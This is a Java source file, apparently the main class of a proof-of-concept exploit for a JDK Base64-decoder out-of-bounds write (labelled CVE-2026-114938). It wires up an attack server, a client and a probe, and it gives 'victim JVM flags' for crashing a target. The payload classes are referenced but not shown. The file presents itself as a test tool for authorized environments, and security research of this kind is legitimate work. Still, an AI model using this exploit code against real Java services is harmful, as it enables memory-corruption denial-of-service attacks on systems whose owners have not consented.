package com.aweimc.j4shell;

/**
 * Entry point.
 *
 * Subcommands:
 *   server  --port 47470 [--bind 127.0.0.1] [--grid 300] [--warm 400000] [--shots 2]
 *   client  --host 127.0.0.1 --port 47470 [--poll 15000]
 *   probe   [--len 129]   standalone bounded check: does this runtime have the layer-1 OOB write?
 *
 * Recommended victim JVM flags (.bat files need %p escaped as %%p):
 *   java -Xmx768m -XX:G1HeapRegionSize=1m -Xbatch \
 *        -XX:ErrorFile=logs/hs_err_pid%p.log -cp out com.aweimc.j4shell.Main server --port 47470 --grid 300
 * Negative control: add -XX:-UseBASE64Intrinsics (server must survive).
 */
public final class Main {

    public static void main(String[] args) throws Exception {
        if (args.length == 0) { usage(); System.exit(2); }
        java.util.Map<String, String> kv = new java.util.HashMap<>();
        for (int i = 1; i + 1 < args.length; i += 2) kv.put(args[i], args[i + 1]);

        switch (args[0]) {
            case "server": {
                int port = Integer.parseInt(kv.getOrDefault("--port", "47470"));
                String bind = kv.getOrDefault("--bind", "127.0.0.1");
                int warm = Integer.parseInt(kv.getOrDefault("--warm", "400000"));
                int gridMb = Integer.parseInt(kv.getOrDefault("--grid", "300"));
                int shots = Integer.parseInt(kv.getOrDefault("--shots", "2"));
                new J4ShellServer(port, bind, warm, gridMb, shots).run();
                break;
            }
            case "client": {
                String host = kv.getOrDefault("--host", "127.0.0.1");
                int port = Integer.parseInt(kv.getOrDefault("--port", "47470"));
                int poll = Integer.parseInt(kv.getOrDefault("--poll", "15000"));
                System.exit(J4ShellClient.run(host, port, poll));
                break;
            }
            case "probe": {
                int len = Integer.parseInt(kv.getOrDefault("--len", "129"));
                System.exit(probe(len));
                break;
            }
            default:
                usage();
                System.exit(2);
        }
    }

    /** Bounded self-check: two-arg overload + oversized dst (spill stays in the guard buffer). 0 = spill present. */
    private static int probe(int len) throws Exception {
        java.util.Base64.Decoder dec = java.util.Base64.getDecoder();
        byte[] big = new byte[Payload.logicalOut(len) + 8192];
        byte[] warmSrc = Payload.validWarm();
        for (int i = 0; i < 200_000; i++) dec.decode(warmSrc);
        byte[] src = Payload.trigger(len);
        java.util.Arrays.fill(big, (byte) 0x5A);
        int logical = Payload.logicalOut(len);
        try { dec.decode(src, big); } catch (IllegalArgumentException expected) { }
        int changed = 0, first = -1, last = -1;
        for (int i = logical; i < big.length; i++) {
            if (big[i] != 0x5A) { changed++; if (first < 0) first = i; last = i; }
        }
        System.out.println("java = " + System.getProperty("java.version"));
        System.out.printf("len=%d logicalOut=%d spill=[%d..%d) oob=%dB%n",
                len, logical, first, last + 1, changed);
        if (changed > 0) {
            System.out.println("REPRODUCED - runtime has the layer-1 out-of-bounds write");
            return 0;
        }
        System.out.println("none - runtime patched / intrinsics off / no AVX-512 VBMI");
        return 1;
    }

    private static void usage() {
        System.out.println("J4Shell-Deterministic-DoS PoC (CVE-2026-114938 derivative) - authorized test environments only; server binds 127.0.0.1 by default");
        System.out.println("  java -cp out com.aweimc.j4shell.Main server --port 47470 --grid 300");
        System.out.println("  java -cp out com.aweimc.j4shell.Main client --host 127.0.0.1 --port 47470");
        System.out.println("  java -cp out com.aweimc.j4shell.Main probe --len 129");
    }
}
